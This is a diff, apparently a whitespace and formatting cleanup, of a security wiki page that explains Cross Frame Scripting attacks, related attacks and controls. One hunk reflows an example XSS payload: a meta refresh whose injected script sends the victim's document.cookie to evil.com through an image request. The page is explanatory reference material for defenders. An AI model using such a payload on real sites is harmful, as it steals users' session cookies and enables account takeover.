@@ -1,12 +1,10 @@
 ---
-
 layout: col-sidebar
 title: Cross Frame Scripting
 author: Rezos, Justin Ludwig
 contributors: KristenS, Michael Brooks, Andrew Smith, kingthorin
 permalink: /attacks/Cross_Frame_Scripting
 tags: attack, Cross Frame Scripting
-
 ---
 
 {% include writers.html %}
@@ -122,8 +120,12 @@ the meta element's URL is wrapped for legibility):
 
 ```html
 <meta http-eqiv="refresh" content="1;url=http://example.com/↵
-    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
-    ?c='+encodeURIComponent(document.cookie)+'\">')</script>">
+flawed-page.html?q=
+<script>
+  document.write('<img src=\"http://evil.com/↵
+      ?c='+encodeURIComponent(document.cookie)+'\">')
+</script>
+">
 ```
 
 The only difference is that when using an iframe, the attacker can hide
@@ -160,8 +162,8 @@ element as a vehicle to run some javascript code in the attacked page.
 ## Related Threat Agents
 
 - An XFS attack exploiting a browser bug which leaks events across
-frames is similar to an attack which uses conventional key-logging
-software.
+  frames is similar to an attack which uses conventional key-logging
+  software.
 
 ## Related Attacks
 
@@ -169,7 +171,7 @@ software.
 - An attacker might use a hidden frame to carry out a [Cross-Site Request Forgery (CSRF)]({{ site.baseurl }}/attacks/csrf) attack.
 - An attacker might use a visible frame to carry out a [Clickjacking](Clickjacking) attack.
 - An XFS attack exploiting a browser bug which leaks events across frames is a form of a Phishing attack (the
-attacker lures the user into typing-in sensitive information into a frame containing a legitimate third-party page).
+  attacker lures the user into typing-in sensitive information into a frame containing a legitimate third-party page).
 
 ## Related Vulnerabilities
 
@@ -178,8 +180,8 @@ attacker lures the user into typing-in sensitive information into a frame contai
 ## Related Controls
 
 - XFS attacks may denied by preventing the third-party web page from
-being framed; the techniques used to do this are the same as those
-used for Clickjacking Protection.
+  being framed; the techniques used to do this are the same as those
+  used for Clickjacking Protection.
 
 ## References
 
